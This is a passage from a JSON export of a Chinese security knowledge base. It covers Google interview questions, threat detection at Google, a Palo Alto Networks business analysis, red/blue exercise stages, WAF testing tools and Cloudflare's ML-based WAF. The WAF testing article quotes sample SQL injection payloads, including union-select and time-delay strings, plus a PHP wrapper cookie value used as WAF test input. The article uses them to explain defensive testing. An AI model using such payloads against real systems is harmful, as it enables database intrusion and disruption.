[BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn)。\r\n\r\n# 参考资料\r\n- [https://cloud.google.com/docs/security/infrastructure/design](https://cloud.google.com/docs/security/infrastructure/design)"},{"fields":{"slug":"/安全知识库/行业观察/Google/Google 安全工程师面试/","title":"Google 基础设施安全设计"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google 基础设施安全设计\r\ntags:\r\n- 行业观察\r\n- Google\r\n- 面试\r\n---\r\n\r\n无意间看到一个小哥分享在Google求职的过程，里面关于面试这部分很有意思，记录如下：\r\n\r\n# 1. Key Insight\r\n\r\n- 面试通知邮件的指引非常清晰：提前了解候选人的背景/技术栈，根据个人情况来调整面试问题\r\n- 硅谷大厂一般都喜欢问写代码的能力和system design，在Google这里也得到了确认\r\n\r\n# 2. 面试确认邮件\r\n\r\n![Sxnzub](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/Sxnzub.jpg)\r\n![qh73sw](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/qh73sw.jpg)\r\n\r\n# 3. 面试问题\r\n\r\n- 【考威胁建模】众所周知，图像解析库中存在安全问题（如 Buffer overflow），您必须设计一个解析图像的安全库，确保其中不存在安全漏洞，您将如何设计它？\r\n- 【考安全架构/设计】为所有需要登录的谷歌服务（例如 youtube）设计单点登录系统\r\n- 【考基础知识】如何在不使用编码和允许使用 javascript 的情况下防止 XSS？\r\n- 【考个人经验】分享你的 fuzzing 经验？\r\n- 【考基础知识】同源策略的起源是什么？\r\n\r\n# 4. 来源\r\n\r\n- [https://haiderm.com/my-experience-with-google-interview-for-information-security-engineer/](https://haiderm.com/my-experience-with-google-interview-for-information-security-engineer/)"},{"fields":{"slug":"/安全知识库/行业观察/Google/Modern Threat Detection at Google/","title":"Google 基础设施安全设计"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google 基础设施安全设计\r\ntags:\r\n- 行业观察\r\n- Google\r\n- 威胁检测\r\n---\r\n\r\n\r\n# 背景\r\n\r\n- 内容来自Google cloud security podcast，EP# 17\r\n- https://cloud.withgoogle.com/cloudsecurity/podcast/modern-threat-detection-at-google/\r\n\r\n# 做客嘉宾\r\n\r\n- **TimPeacock,** Google Cloud 威胁检测产品经理。\r\n- **Anton Chuvakin,** 前Gartner分析师，后来加入Alphabet子公司Chronicle，现Google Cloud 安全解决方案专家。\r\n- **Julien Vehent,** Google 检测响应(Detection and Response)团队负责人。\r\n\r\n# 总结\r\n\r\n- 威胁检测的定义：**将威胁相关的知识转换为检测能力**（thread detection is really how the **threat knowledge becomes detections**）。\r\n\r\n- ### Google所处的环境是怎样的？\r\n\r\n  - Google很多业务都上云了，云环境和传统IDC的很大区别在于：\r\n    - 控制平面（IAM）的不同，泄露AK/SK意味着系统被完全控制。\r\n    - 云环境下的攻击面要小很多，云平台做了很多secure by default的东西。\r\n    - 安全团队可以集中力量在高级威胁检测上，而不并浪费时间在基础领域（如漏洞/补丁管理、IOC运营等）。\r\n\r\n- ### Google是如何将威胁相关的知识转换为检测能力的？\r\n\r\n  - 基本师从安全的三大支柱（人员、流程和技术）来讲的\r\n    - **人员**\r\n      - 必须具备代码能力，在云环境下进行威胁检测意味着每天都在写代码。\r\n      - 拥有好奇心和逻辑思维能力，能不断提出问题，不断问为什么，直到得出一个假设，结果证明存在一个潜在的漏洞。\r\n      - 类似code review，同一个告警日志需要有多个人来排查，可能会得出不同的结论。\r\n      - 写检测规则和做应急响应的是同一个人/团队**（如果你不负责设计如何告警，你会真关心它是否在凌晨 02:00 触发吗？）**\r\n    - **流程**\r\n      - 工单系统：记录可疑的告警，由人进行分类跟进（误报可在以后进行审查，如对威胁情报进行回溯）。\r\n      - 持续改进：\r\n        - 检测工程就是软件工程，会使用单元测试/集成测试。\r\n        - 红蓝对抗来验证，除了自己的红队，也会使用第三方安全公司（引入外部知识，消除内部红队已知的各种信息）。\r\n        - 事件驱动，提到了[极光行动](https://en.wikipedia.org/wiki/Operation_Aurora)。\r\n    - **技术**\r\n      - 基础能力的建设：足够全的数据源/日志（全量日志可以存好几个月）。\r\n      - 威胁建模：\r\n        - 针对业务：与产品或项目的负责人进行实际交谈，并与他们一起进行威胁建模。\r\n        - 针对通用技术：如使用restul API，可以使用现成的威胁建模。"},{"fields":{"slug":"/安全知识库/行业观察/Palo Alto Networks/Palo Alto Networks商业化分析/","title":"Palo Alto Networks商业化分析"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Palo Alto Networks商业化分析\r\ntags:\r\n- 行业观察\r\n- Palo Alto Networks\r\n---\r\n\r\n# 摘要\r\n\r\nPalo Alto是下一代防火墙的龙头，于2005年成立于美国加利福尼亚州，2007年，公司首先提出下一代防火墙概念；2011-2020年公司连续9年被评选为Gartner网络防火墙魔力象限领导者。截至2021财年第一季度，公司下一代防火墙已有逾71000家客户，年新增客户数达约8000家。\r\n\r\n- **Palo Alto从端到云，安全能力边界不断拓展**\r\n  - 公司的发展历程可根据网络安全技术的演变分为三个阶段：\r\n    - 2007-2013年，公司专注于下一代防火墙产品的开发；\r\n    - 2013-2017年，公司在下一代防火墙的基础上转向云安全和端点防护功能的开发；\r\n    - 2017年开始，公司加大投资云与人工智能，发展自动化整体网络安全解决方案。\r\n  - 目前，公司已经形成企业安全平台（Strata）、云安全平台（Prisma）和安全运营平台（Cortex）三大安全平台，能够为用户提供从端到云的整体解决方案。\r\n- **下一代安全（Next-Generation Security）成为Palo Alto重点发力方向**\r\n  - 下一代安全主要包括云安全平台（Prisma）与安全运营平台（Cortex）：\r\n    - 云安全平台（Prisma）是针对公有云、与威胁情报云相关的订阅服务集合平台。截至2021财年第一季度，Fortune 100企业中Prisma Cloud客户占比达到了70%，Global 2000企业中Prisma Cloud客户占比为20%。\r\n    - 安全运营平台（Cortex）是与端点防护相关的开放集成的人工智能安全平台。截至2021财年第一季度，Cortex已经完成了超过400万个事件的自动化处理，已有65%的Fortune 100企业和34%的Global 2000企业成为了Cortex的客户。\r\n- **营收高速增长，订阅收入占比不断提升**\r\n  - 2012财年至2020财年，公司营收年复合增速为38.3%，实现高速增长。\r\n  - 得益于公司云平台和安全运营平台业务的快速增长，公司订阅业务收入占比快速提升，到2020财年已经达到69%，成为公司主要收入来源。\r\n  - 公司“下一代安全”订单收入增长迅速，在总订单收入中的占比从13%上升至了2021财年第一季度的24%，是公司未来持续创新与拓展的主要方向。\r\n\r\n# 产品线丰富，整体解决方案行业领先\r\n\r\n**企业安全平台（Strata）提供业内领先的网络安全套件**\r\n\r\n- 企业安全平台（Strata）是以下一代防火墙设备为基础的产品组合平台。该平台下主要有下一代防火墙、相关订阅服务和网络安全管理工具Panorama.\r\n- ![KgE7X1](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/KgE7X1.jpg)\r\n\r\n**下一代防火墙具备四大独特技术，形成强技术壁垒**\r\n\r\n- **区别于传统的统一威胁管理（UTM）平台，公司的下一代防火墙依靠四项自其2007年诞生以来便具备的独特技术：App-ID、User-ID、Content-ID和单通道并行处理体系结构，满足了客户在复杂环境下的网络安全需求。**2020年7月，公司发布 行业深度报告请务必参阅正文后面的信息披露和法律声明10/ 23了最新的下一代防火墙运行系统版本PAN-OS 10.0，其中的IoT订阅服务带来了设备识别技术Device-ID。多种技术的结合，共同树立了下一代防火墙强大的技术壁垒。\r\n- **App-ID是一种先进的流量精确分类机制，实现了对应用程序的识别、可视性及控制。**区别于传统防火墙基于端口和协议的流量分类机制，它可以在设备检测到流量后判断传输数据的具体应用程序身份，无论该应用程序是否透过网页服务、SSL加密或其他规避技术，从而突破了传统防火墙的流量分类限制\r\n- **User-ID实现了使用者层级的可视性与控制。**通过与MicrosoftAD的无缝整合，下一代防火墙可以动态对应IP地址和用户，还可以针对用户进行政策制定，从而控制用户对应用程序的使用。\r\n- **Content-ID具备的技术组件实现了预防流量中的威胁、提供可视性，和文件与数据筛选功能。**威胁预防组件提供了入侵监测和防御功能；网址过滤组件提供了海量高度整合、可定制化的网址过滤资料库；文件与数据筛选组件同时利用App-ID的深层应用程序检查功能，实现了对敏感数据传输的阻挡。\r\n\r\n**下一代防火墙产品系列完善，客户稳定增长**\r\n\r\n- 下一代防火墙经过多年发展目前分为实体防火墙PA系列、虚拟防火墙VM系列、容器防火墙CN系列。\r\n\r\n# 云安全平台（Prisma）提供业内最全面的云安全产品\r\n\r\n安全平台（Prisma）是针对公有云、与威胁情报云相关的订阅服务集合平台。云安全平台下的产品套件有云原生安全平台Prisma Cloud、云交付式移动用户安全服务Prisma Access、和保护SaaS访问安全服务Prisma SaaS。其中，Prisma Access和CloudGenix SD-WAN相结合，组成了业内最全面的安全访问服务边缘SASE（Secure Access Service Edge），为用户提供具有云交付安全功能的全球云网络。\r\n\r\n- ![HwMvHg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/HwMvHg.jpg)\r\n\r\n# 安全运营平台（Cortex）提供业内最全面的安全运营产品套件\r\n\r\n安全运营平台（Cortex）是与端点防护相关的开放集成的人工智能安全平台。Cortex是云应用框架的升级，由Cortex Data Lake驱动，聚焦于深度挖掘和分析，致力于发现潜在威胁和未知攻击手段，以及攻击溯源、自动化响应流程等，为企业提供一流的检测、调查、自动化和响应能力。Cortex平台下有扩展的检测与响应套件Cortex XDR、扩展的安全编排、自动化和响应平台CortexX SOAR、专为安全分析创建的优质数据湖Cortex Data Lake、和情景威胁情报服务AutoFocus。\r\n\r\n# 财务分析：营收高速增长，订阅收入占比不断提升\r\n\r\n**公司主营业务收入始终保持着快速增长。**2012财年至2020财年，公司营收年复合增速为38.3%。2020财年总营收34.08亿美元，同比增速略有下降，主要原因是新冠疫情导致实体防火墙部署需求有所下降，相应产品销售收入下降。\r\n\r\n财务报表角度拆分：订阅与支持服务占比快速提升，成为主要收入来源\r\n\r\n- **订阅与支持服务收入成为主要收入来源。**公司财务报表将主营业务收入划分为产品销售收入和订阅与支持服务收入。产品销售主要包括防火墙设备的销售，订阅和支持服务收入包括新客户购买的基于防火墙以及独立提供的订阅与支持服务，还有老客户的续订和支持服务。2009财年至2020财年，订阅与支持服务销售收入占比持续上升，于2016财年超过产品销售收入占比，2020财年已达到69%，成为公司营收主要组成部分。\r\n\r\n公司业务角度拆分：下一代安全业务收入高速增长\r\n\r\n- 2019年开始，公司将总订单收入分为了两部分：防火墙即平台（Firewall-as-a-Platform，简称FwaaP）和下一代安全（Next-Generation Security，简称NGS）。\r\n- “防火墙即平台”即公司的下一代防火墙业务，该部分订单收入包括了实体防火墙、虚拟防火墙相关订阅与支持服务、Prisma Access（属软件防火墙）及CloudGenix的订单收入。\r\n- “下一代安全”部分的订单收入则包括了云安全平台（Prisma）与安全运营平台（Cortex）套件订单，以及虚拟防火墙订单所贡献的收入。\r\n\r\n**2021财年第一季度，公司将原先划分的两大业务微调并重新定义为“网络安全”和“云与人工智能”。**\r\n\r\n![O4vvoz](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/O4vvoz.jpg)\r\n\r\n![uCOJuf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uCOJuf.jpg)\r\n\r\n\r\n\r\n# 未来发展方向：机器学习技术与5G\r\n\r\n未来公司将继续在机器学习、人工智能等方向加大投入。2020年6月17日，公司正式发布了业界第一款基于机器学习的下一代防火墙版本PAN-OS 10.0。该更新版本将机器学习技术嵌入防火墙核心，主动帮助并智能地阻止威胁，保护物联网设备，并推荐安全策略。新版本防火墙集合了四大创新功能：基于机器学习技术的本地恶意软件和网络钓鱼防御功能、零延迟签名更新、基于机器学习技术的集成物联网安全，和基于机器学习技术的安全策略。基于机器学习技术的下一代防火墙将在以下四点为企业提高安全运营效率：\r\n\r\n- 即时防范高达95%的未知文件和Web威胁；\r\n- 自动提供安全策略建议；\r\n- 提供实时防御功能；\r\n- 扩展可视性和安全性至所有设备，无需部署额外的传感器。\r\n\r\n# 来源：海外网安研究系列之PaloAlto：“下一代”安全领导者\r\n\r\n- [https://docs.google.com/viewerng/viewer?url=https://pdf.dfcfw.com/pdf/H3_AP202103121471521418_1.pdf](https://docs.google.com/viewerng/viewer?url=https://pdf.dfcfw.com/pdf/H3_AP202103121471521418_1.pdf)"},{"fields":{"slug":"/安全知识库/行业观察/行业报告/年度大型攻防实战全景：红蓝深度思考及多方联合推演/","title":"年度大型攻防实战全景：红蓝深度思考及多方联合推演"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 年度大型攻防实战全景：红蓝深度思考及多方联合推演\r\ntags:\r\n- 行业观察\r\n- 红蓝对抗\r\n---\r\n\r\n概要：本报告通过六张实战推演图，结合安全能力者、第三方机构和安全运营者的观点，展示了攻击方从攻击面分析、边界突破、横向渗透到靶标攻陷的攻击过程，防守方从基础保护、强化保护到协同保护的纵深防御体系，描绘了大型网络安全攻防实战演习的全景对象和步骤推演。\r\n\r\n![OCFspR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/OCFspR.jpg)\r\n\r\n图解：红蓝双方围绕保护对象（神经中枢靶标）进行攻击与防御策略制定，在攻击面分析与暴露面收敛、边界突破与防御、横向渗透和区域控制，核心区攻陷或强控开展推演；\r\n\r\n重点: 攻击防守策略的制定犹如作战计划和防御计划是推演的前提，不同阶段制定不同的攻击和防守策略，攻击方总体是由点到面再回到点，防守方则是由面到面再回到核心点，策略方法与攻防双方的能力结合进行层层渗透和纵深防御；\r\n\r\n攻击：策略制定-攻击面分析-边界突破-横向渗透-攻陷目标-潜伏/掩盖/撤退；\r\n\r\n防御：策略制定-暴露面收敛-边界防护-区域控制-强化控制-基础/强化/协同；\r\n\r\n![BtcvtE](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/BtcvtE.jpg)\r\n\r\n图解：红蓝攻守双方围绕保护对象（神经中枢靶标）进行攻击与防御策略制定后，第一步双方开展的则是攻击面分析与暴露面收敛；\r\n\r\n重点：互联网信息、组织结构、人员信息、第三方平台（开源平台、云平台等）、供应链体系（设备、人员、服务、DNS、ISP、ICP）等，以及对外服务的业务应用层、系统层、数据层、网络层、平台层等的弱点以及互联网IP、端口、域名、VPN、邮件等以及各方面的用户信息，口令等；\r\n\r\n攻击：信息收集、社工、多层扫描、爬虫、钓鱼、撞库、SQL注入等；\r\n\r\n防御：规范上线第三方平台安全要求、提高供应链服务商安全要求、规范组织互联网信息、减少不必要的互联网出口、关闭不必要的业务、服务和端口、常态化动态化实时深度监测、识别嗅探者工具、清楚暴露面以及实时更新弱点问题及时加固、安全组织常态化、意识培训常态化等。\r\n\r\n![BDKbIk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/BDKbIk.jpg)\r\n\r\n图解：红蓝攻守双方围绕保护对象（神经中枢靶标）进行攻击与防御策略制定后，第一步双方开展的则是攻击面分析与暴露面收敛，第二步进入到边界突破/防守阶段。\r\n\r\n重点：攻击方根据攻击面分析与攻击方案推演，洞悉可以利用的各种漏洞，进行攻击路径的选择、渗透与突破。边界突破利用的攻击手段将会是多种多样，目的就是撕开靶标的最外层防御系统，突破的点往往是常令人疏忽的或难于管理的地方。防守方意识是第一位的、应清晰了解自身的边界防御情况，了解短板，做好第一道防线，开展管理、技术、运营体系落地建设与运营；\r\n\r\n攻击：漏洞利用、自动及手工渗透、字典攻击、口令爆破、DDOS、后门、钓鱼等\r\n\r\n防守：多因素认证、访问控制、双冗余、异构、web监测及防御、蜜罐、流量监测与清洗、恶意代码防护、入侵监测与防护、实时弱点监控与加固、特权用户管控、弱口令策略及清理、清除冗余安全策略、威胁情报、攻击溯源等。\r\n\r\n![xPCr9d](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xPCr9d.jpg)\r\n\r\n图解：红蓝攻守双方围绕保护对象（神经中枢靶标）进行攻击与防御策略制定后，第一步双方开展的则是攻击面分析与暴露面收敛，第二步进入到边界突破/防守阶段，渗透成功将进入第三步横向渗透和区域控制的较量阶段；\r\n\r\n重点：攻击方突破边界防护的概率是和防守方防御成熟度有很大关系，突破第一道防线以后攻击方一方面会尽可能的伪装自己，同时在黑暗处持续寻找下一步进攻路径和跳板，防守方丢失第一防线其实还不算可怕，虽然形势非常严峻和被动，如果深度监测检测方法有效、安全域控策略和加固做的到位，还可以及时发现渗透横向移动的异常行为，致使攻击方只能短期进入，也可以通过强大的区域控制策略和手段，在第三阶段取得胜利；\r\n\r\n攻击：漏洞利用、自动及手工渗透、字典攻击、口令爆破、提权攻击等；\r\n\r\n防守：安全域分层划分、域访问制定强控制策略、清除冗余策略、内部账号强认证与监控、分层区域边界异构、实施深度流量监测与预警、恶意代码防护异构、实施可信、实时弱点监控与加固、特权用户管控、弱口令策略及清理、清除冗余安全策略等。\r\n\r\n![8Kdwr5](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/8Kdwr5.jpg)\r\n\r\n图解：红蓝攻守双方围绕保护对象（神经中枢靶标）进行攻击与防御策略制定后，第一步双方开展的则是攻击面分析与暴露面收敛，第二步进入到边界突破/防守阶段，第三步横向渗透和区域控制后如果域控失陷，就将进入核心较量的第四步神经中枢靶标攻陷/强控阶段；\r\n\r\n重点：攻击方一旦突破域控，一般拿下核心靶标不会遥远，虽然这个过程往往需要有较长的一段时间，但确实已到了关键时刻，如果这个时候防守方还没有监测发现，核心靶标被攻陷的概率几乎是100%，但并不是完全没有机会，防守方如果在一些核心点做好，虽然肯定有较大损失，但还可以保护好核心神经中枢靶标不被攻陷；\r\n\r\n攻击：漏洞利用、自动及手工渗透、字典攻击、口令爆破、提权攻击等；\r\n\r\n防守：实时深度流量监测与预警、实时弱点监控与加固、强控特权用户、关闭靶标不必要的服务和端口，实施可信黑白名单强策略、清除靶标不必要的用户、强化靶标多因素认证和增强口令强度等。\r\n\r\n![JjsGbo](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JjsGbo.jpg)\r\n\r\n图解：综上所述，攻击方不会耗费大量资源和精力去攻击没有价值的系统，防守方的防御思路从被动到主动、从边界到纵深、从基础保护踏实做起（明确保护对象、暴露面进行收敛、多因素认证、访问策略落地清晰、实时深度监测和做好可信加固、管理好用户信息、强管控特权用户，杜绝弱口令等、以合规为基础，完成管理、技术和运维体系基本要求），围绕重点和关键环节，进行强化保护建设\r\n\r\n（安全策略一体化、深度监测与溯源、深度实时监测、日常加强演练和推演、建立清晰的全量和动态的资产库、建立完整和实时的风险库、建立较为全面的能力库，建设安全运营一体化中心，实现防御、检测、预测和响应核心关键环节的ID、IP、ACT的动态的异常的精准监控和分析，进行精准响应和防御），在大规模攻击和紧急事件的发生时，可以调集运营者自身、行业单位、民间力量、监管单位开展协同保护（信息共享和指挥协同）。\r\n\r\n# 来源\r\n\r\n- [https://mp.weixin.qq.com/s?__biz=MzIwNTA0NTUxMg%3D%3D&chksm=9737a694a0402f82057a86441c298fe32c0cdf01c7536e1e1eb30c99dc9fdc777ef21604aa61&idx=1&mid=2247486707&scene=21&sn=8f3a8b65cce01d0e14dbb1fe76d611ab#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzIwNTA0NTUxMg%3D%3D&chksm=9737a694a0402f82057a86441c298fe32c0cdf01c7536e1e1eb30c99dc9fdc777ef21604aa61&idx=1&mid=2247486707&scene=21&sn=8f3a8b65cce01d0e14dbb1fe76d611ab#wechat_redirect)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/Web应用防火墙/WAF能力评估&测试/","title":"WAF能力评估&测试"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: WAF能力评估&测试\r\ntags:\r\n- Blue Team基础设施\r\n- Web应用防火墙\r\n- 能力评估\r\n---\r\n\r\n# 1. 评估工具\r\nWAF能力评估工具在业界都比较少见，为数不多的几个还是由WAF供应商开发的，如：\r\n\r\n- **Framework for Testing WAFs (FTW!) (https://github.com/fastly/ftw)**，由 ModSecurity 和 Fastly 的研究人员创建，旨在帮助为 WAF 规则提供严格的测试。它使用 OWASP Core Ruleset V3 作为基线来测试 WAF 上的规则。规则集中的每个规则都加载到一个 YAML 文件中，该文件发出将触发这些规则的 HTTP 请求。\r\n- **GoTestWAF(https://github.com/wallarm/gotestwaf)**，由另一家 WAF 供应商 Wallarm 负责维护。GoTestWAF 使用 YAML 来定义多个测试，这些测试使用不同的有效载荷变体、绕过技术、编码以及有效载荷插入点（包括模拟 API 调用的 JSON 结构）。 本文使用GoTestWAF进行测试。\r\n- **WAFLab(https://github.com/microsoft/waflab)**，微软出品，使用 YAML 来定义多个测试用例，默认使用modsecurity的规则进行验证。\r\n\r\n# 2. GoTestWAF 如何工作？\r\nGoTestWAF 生成具有预定义的基本有效负载的请求以及特定于不同 API（REST、SOAP、XMLRPC）的攻击。之后，它将它们发送到应用程序并分析响应以在控制台输出中生成详细报告或作为 PDF。\r\n\r\n主要测试思路是将攻击载荷编码并放置在 HTTP 请求的不同部分：其正文、标头、URL 参数等。为了简化，实现了以下逻辑：\r\n\r\n- **有效载荷 → 编码器 → 占位符**\r\n\r\n这意味着每个负载样本（恶意攻击样本，例如像“alert(1)”这样的 XSS 字符串）将首先以某种方式编码，然后放入 HTTP 请求中。还可以选择使用保持字符串原样的普通编码器。\r\n\r\n为了使测试可读，GoTestWAF 使用 YAML DSL。以下是 SQL 注入负载的示例：\r\n\r\n```\r\npayload:\r\n  '\"union select -7431.1, name, @aaa from u_base--w-'\r\n  \"'or 123.22=123.22\"\r\n  \"' waitfor delay '00:00:10'--\"\r\n  \"')) or pg_sleep(5)--\"\r\nencoder:\r\n  Base64Flat\r\n  Url  \r\nplaceholder:\r\n  UrlPath\r\n  UrlParam\r\n  JsonBody\r\n  Header\r\n```\r\n\r\n作为每 4 个有效载荷、2 个编码器和 4 个占位符的排列结果，本次测试将发送 424=32 个请求。\r\n\r\n# 3. WAFLab 是怎样的？\r\n使用AutoGen模块自动生成测试用例，大体思路和GoTestWAF差不多，值得一提的是，它会从Mod Security的规则中提取信息，不过整体数量还是蛮少的：\r\n\r\n| TYPE                                | Total Rule | Supported Rule | Passed Rule |\r\n| ----------------------------------- | ---------- | -------------- | ----------- |\r\n| METHOD-ENFORCEMENT                  | 1          | 0              | 0           |\r\n| SCANNER_DETECTION                   | 5          | 5              | 5           |\r\n| PROTOCOL-ENFORCEMENT                | 39         | 19             | 10          |\r\n| PROTOCOL-ATTACK                     | 7          |                |             |\r\n| APPLICATION-ATTACK-LFI              | 4          |                |             |\r\n| APPLICATION-ATTACK-RFI              | 4          |                |             |\r\n| APPLICATION-ATTACK-RCE              | 20         |                |             |\r\n| APPLICATION-ATTACK-PHP              | 14         |                |             |\r\n| APPLICATION-ATTACK-NODEJS           | 1          |                |             |\r\n| APPLICATION-ATTACK-XSS              | 30         |                |             |\r\n| APPLICATION-ATTACK-SQLi             | 41         |                |             |\r\n| APPLICATION-ATTACK-SESSION-FIXATION | 3          |                |             |\r\n| APPLICATION-ATTACK-JAVA             | 3          |                |             |\r\n\r\n生成的测试用例格式如下：\r\n\r\n```yaml\r\n  meta:\r\n    author: Microsoft\r\n    enabled: true\r\n    name: dev-933140.yaml\r\n    description: This YAML file is automatically generated by WAFLab AutoGen\r\n  tests:\r\n  - test_title: 933140-0\r\n    desc: REQUEST_COOKIES\r\n    stages:\r\n    - stage:\r\n        input:\r\n          stop_magic: true\r\n          dest_addr: 127.0.0.1\r\n          method: GET\r\n          port: 80\r\n          protocol: http\r\n          uri: /\r\n          version: HTTP/1.0\r\n          headers:\r\n            Cookie: O09SFeTTuD=PHP://TEMP\r\n            Host: wafdefaultruleset20.waftestdf.azfdtest.xyz\r\n        output:\r\n          status:\r\n          - 403\r\n```\r\n\r\n# 4. 参考资料\r\n- [gotestwaf/README.md at master · wallarm/gotestwaf (github.com)](https://github.com/wallarm/gotestwaf/blob/master/README.md)\r\n- [waflab/autogen at master · microsoft/waflab (github.com)](https://github.com/microsoft/waflab/tree/master/autogen)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/Web应用防火墙/通过机器学习改善 WAF/","title":"WAF能力评估&测试"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: WAF能力评估&测试\r\ntags:\r\n- Blue Team基础设施\r\n- Web应用防火墙\r\n- 机器学习\r\n- Cloudflare\r\n---\r\n\r\n# 1. 背景\r\nCloudflare 每秒处理3200 万次 HTTP 请求，22% web 服务器为 [W3Techs](https://w3techs.com/technologies/details/ws-cloudflare) 所知的网站使用 Cloudflare。Cloudflare 为五分之一的互联网资产保护其流量，因而具备独特的优势，得以在威胁出现时就加以识别，并跟踪其进化和变异。\r\n\r\nWeb 应用程序防火墙（WAF）处于 Cloudflare 安全工具箱的核心位置，而托管规则是 [WAF](https://www.cloudflare.com/zh-cn/learning/ddos/glossary/web-application-firewall-waf/) 的关键功能。托管规则是 Cloudflare 分析师团队创建的一组规则，用于阻止显示已知攻击模式的请求。这些托管规则攻击对于现有攻击手段的模式非常有效，因为它们已经过广泛测试，能最大限度减少误报。托管规则的不足之处是，常常会错过攻击的变体（也称为绕过），因为基于静态正则表达式的规则本质上对引入的特征变体（如通过模糊技术）敏感。\r\n\r\n在[[log4j]]漏洞爆发的时候，由于攻击者尝试绕过 WAF，Cloudflare必须不断更新规则来匹配变种。此外，优化规则需要大量的人工干预，而且通常要在绕过被识别或甚至被利用后才能起作用，导致保护变得被动。\r\n\r\n为了解决这个问题，Cloudflare提供一个新工具，旨在无需人工干预的情况下识别绕过和恶意负载，以防其造成破坏。现在客户能够从一个机器学习模型中获取信号，这个模型根据托管规则和分类的善意/恶意流量和增强数据来训练，从而针对更大范围的新老攻击提供更佳的保护。\r\n\r\n# 2. 第一个自我学习的 WAF\r\n全新检测系统增强现有的托管规则集，提供三大优势：\r\n1.  适用于您的所有流量。系统会根据每个请求包含 SQLi 或 XSS 攻击等的可能性对其进行评分。这实现了一种全新的 WAF 分析体验，让您能够探索自己整体流量中的趋势和模式。\r\n2.  检测速率根据过去的流量和反馈而改善。托管规则集将所有 Cloudflare 流量分类为善意/恶意流量后，提供给该模型进行训练。这样一来，小型网站也能获得与大型网站同级的保护。\r\n3.  性能的新定义该机器学习模型在绕过和异常被利用或被人类研究人员识别前就将其识别出来。\r\n\r\n其中秘诀在于如下几方面的结合：创新的机器学习建模，庞大的训练数据集（基于我们每天阻止的攻击，以及数据增强技术），基于行为测试原则的正确评估和测试框架，以及让我们在几乎毫不增加延迟的前提下评估每一个请求的尖端工程技术。\r\n\r\n# 3. 新的 WAF 体验\r\n全新检测系统基于与[机器人分析（Bot Analytics）](https://blog.cloudflare.com/introducing-bot-analytics/) 一同发布的范式。根据这一方法，无论我们是否采取行动，都会对每个请求进行评估并赋分。由于我们对每一个请求赋分，针对发送到用户服务器的全部流量，用户能够看到分数如何随着时间变化。\r\n\r\n![3STXCU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/3STXCU.jpg)\r\n\r\n此外，用户还可以查看请求的特定攻击手段（如SQLi的）评分直方图，并找到合适的评分值来区分善意流量和恶意流量。配置的规则如下图：\r\n\r\n![tVmqXg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/tVmqXg.jpg)\r\n\r\n# 4. 工作原理\r\n\r\n基于机器学习的检测补充了现有的托管规则集，例如 OWASP 和 Cloudflare 托管规则。这套系统基于旨在没有研究人员或最终用户直接监督的情况下识别攻击模式变体或异常的模型。\r\n\r\n截至今日，Cloudflare已经公开两种攻击手段的分数：SQL 注入（SQLi）和跨站点脚本（XSS）。用户能根据三个单独的分数来创建自定义 WAF/防火墙规则：总分 （`cf.waf.ml.score`），SQLi 分数和 XSS 分数（分别为 `cf.waf.ml.score.sqli`，`cf.waf.ml.score.xss`,）。这些分数介于 1-99，其中 1 为绝对恶意，99 代表有效流量。\r\n\r\n![CSU2ZS](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/CSU2ZS.jpg)\r\n\r\n然后，我们使用现有 WAF 规则分类的流量对该模型进行训练，它对原始请求的一个变异版本有效，使其更容易识别攻击的指纹。\r\n\r\n对于每个请求，该模型对请求的每个部分独立评分，从而有可能识别恶意负载所在的位置，例如，在请求的正文、URI 或标头中。\r\n\r\n![EZsUM7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/EZsUM7.jpg)\r\n\r\n这看起来很简单，但 Cloudflare 的工程师需要解决一系列挑战才能做到。其中包括：如何建立一个可靠的数据集，可扩展的数据标签，选择正确的模型架构，以及要求对 Cloudflare 全球网络处理的每一个请求（每秒 3200 万个）执行分类。\r\n\r\n# 5. 参考资料\r\n- [通过机器学习改善 WAF (cloudflare.com)](https://blog.cloudflare.com/zh-cn/waf-ml-zh-cn/)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/系统设计/系统设计基础知识/","title":"系统设计基础知识"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 系统设计基础知识\r\ntags:\r\n- Blue Team基础设施\r\n- 系统设计\r\n- 安全架构\r\n---\r\n\r\n选择正确的架构 = 选择正确的战斗 + 管理权衡\r\n\r\n# 第一步：描述使用场景，约束和假设\r\n把所有需要的东西聚集在一起，审视问题。不停的提问，以至于我们可以明确使用场景和约束。讨论假设。\r\n\r\n- 谁会使用它？\r\n- 他们会怎样使用它？\r\n- 有多少用户？\r\n- 系统的作用是什么？\r\n- 系统的输入输出分别是什么？\r\n- 我们希望处理多少数据？\r\n- 我们希望每秒钟处理多少请求？\r\n- 我们希望的读写比率？\r\n\r\n# 